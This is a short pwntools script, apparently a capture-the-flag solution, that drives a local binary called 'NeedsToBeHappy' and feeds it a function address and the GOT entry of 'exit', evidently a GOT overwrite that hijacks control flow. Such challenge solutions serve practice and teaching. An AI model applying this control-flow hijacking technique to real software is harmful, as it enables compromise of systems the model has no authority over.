from pwn import *  # type: ignore

context.binary = "./NeedsToBeHappy"
e: ELF = context.binary  # type: ignore     #just to make the typechecker happy
p = process()
p.sendline(b"y")
p.sendline(str(e.functions["give_the_man_a_cat"].address).encode("ascii"))
p.sendline(str(e.got["exit"]).encode("ascii"))
